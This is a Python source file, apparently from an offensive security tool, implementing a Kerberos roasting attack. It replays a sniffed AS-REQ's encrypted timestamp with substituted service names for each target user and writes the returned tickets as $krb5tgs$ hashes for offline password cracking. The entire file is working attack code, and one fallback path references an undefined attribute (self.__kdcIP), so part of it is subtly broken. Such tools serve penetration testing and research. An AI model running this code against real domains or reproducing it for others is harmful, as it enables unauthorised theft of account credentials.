from scapy.all import Kerberos
from ritm.logger import logger, console, OBJ_EXTRA_FMT
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter, EncryptedData
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from binascii import hexlify
import datetime
import random

class Roaster:

    def __init__(self, users, as_req, output_file, dc_ip):
        self.__users = users
        self.__as_req = as_req
        self.__dc_ip = dc_ip
        self.__output_file = output_file
        self.__output_file_handle = None
        self.__cname = None
        self.__realm = None
        self.roasted = -1


    # replay the sniffed AS-REQ with alternate sname fields,
    #   one for each user/spn in the provided file
    def roast(self):
        if self.__output_file:
            self.__output_file_handle = open(self.__output_file, 'w')

        # grab cname/sname info from the sniffed AS-REQ
        self.__cname = self.__as_req[Kerberos].root.reqBody.cname.nameString[0].val.decode('utf-8')
        self.__realm = self.__as_req[Kerberos].root.reqBody.realm.val.decode('utf-8')
        sname = self.__as_req[Kerberos].root.reqBody.sname.nameString[0].val.decode('utf-8')
        sname_realm = self.__as_req[Kerberos].root.reqBody.sname.nameString[1].val.decode('utf-8')

        logger.info(f'Sniffed AS-REQ for user [blue bold]{self.__cname}@{self.__realm}[/] to service [green bold]{sname}/{sname_realm}[/]', extra=OBJ_EXTRA_FMT)

        if self.__dc_ip is None:
            self.__dc_ip = self.__realm
            logger.debug(f'[bright_cyan bold]--dc-ip[/] not specified, setting DC to {self.__realm}', extra=OBJ_EXTRA_FMT)

        logger.info('Starting roaster...')

        logger.info('Checking if the captured AS-REQ is valid with a request for [green bold]krbtgt[/]', extra=OBJ_EXTRA_FMT)
        if self._construct_AS_REQ('krbtgt', output=False):
            self.as_req_is_valid = True

            logger.info(f'The AS-REQ is valid! Attempting to roast {len(self.__users)} users')
            for user in self.__users:
                if user != '':
                    _ = self._construct_AS_REQ(user)

            if self.__output_file:
                self.__output_file_handle.close()

            logger.info(f'Roaster complete! Roasted {self.roasted} accounts')
        else:
            self.as_req_is_valid = False


    # slightly modified from 
    #   https://github.com/SecureAuthCorp/impacket/blob/master/impacket/krb5/kerberosv5.py#L95
    def _construct_AS_REQ(self, username, output=True):
        clientName = Principal(self.__cname, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # new raw AS-REQ
        asReq = AS_REQ()
        
        # set the target username as the sname 
        serverName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = True
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        # Sub in the encrypted timestamp data from the sniffed AS-REQ
        encryptedData = EncryptedData()
        encryptedData['etype'] = self.__as_req[Kerberos].root.padata[0].padataValue[0].etype.val
        encryptedData['cipher'] = self.__as_req[Kerberos].root.padata[0].padataValue[0].cipher.val
        encodedEncryptedData = encoder.encode(encryptedData)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
        asReq['padata'][0]['padata-value'] = encodedEncryptedData

        asReq['padata'][1] = noValue
        asReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][1]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        reqBody['realm'] = self.__realm

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        logger.debug(f'Replaying AS-REQ with substitute sname [blue bold]{username}[/]', extra=OBJ_EXTRA_FMT)

        try:
            r = sendReceive(message, self.__realm, self.__dc_ip)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, self.__realm, self.__kdcIP)
            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_S_PRINCIPAL_UNKNOWN.value:
                logger.debug(f'Received [red bold]ERR_S_PRINCIPAL_UKNOWN[/] for SPN [blue bold]{username}[/]', extra=OBJ_EXTRA_FMT)
                return False
            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
                logger.debug(f'Received [red bold]KDC_ERR_PREAUTH_FAILED[/] for SPN [blue bold]{username}[/] (probably invalid password was entered)', extra=OBJ_EXTRA_FMT)
                return False
            else:
                raise e
        except OSError as e:
            if 'Name or service not known' in str(e):
                logger.error(f'Unable to connect to {self.__realm}:88. Try specifying [bright_cyan bold]--dc-ip[/]', extra=OBJ_EXTRA_FMT)
            else:
                logger.error(str(e))
            exit(1)
        
        self.roasted += 1

        if output:
            logger.info(f'Roasted SPN [blue bold]{username}[/] :fire:', extra=OBJ_EXTRA_FMT)
            self._outputTGS(r, username, username)

        return True


    # https://github.com/ShutdownRepo/impacket/blob/getuserspns-nopreauth/examples/GetUserSPNs.py#L178
    def _outputTGS(self, ticket, username, spn):
        fd = self.__output_file_handle
        decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                console.print('\n' + entry + '\n', highlight=False)
            else:
                fd.write(entry + '\n')
                logger.info(f'Hash written to {self.__output_file}')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                console.print('\n' + entry + '\n', highlight=False)
            else:
                fd.write(entry + '\n')
                logger.info(f'Hash written to {self.__output_file}')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                console.print('\n' + entry + '\n', highlight=False)
            else:
                fd.write(entry + '\n')
                logger.info(f'Hash written to {self.__output_file}')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                console.print('\n' + entry + '\n', highlight=False)
            else:
                fd.write(entry + '\n')
                logger.info(f'Hash written to {self.__output_file}')
        else:
            logger.error('Skipping %s/%s due to incompatible e-type %d' % (
            decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
            decodedTGS['ticket']['enc-part']['etype']))
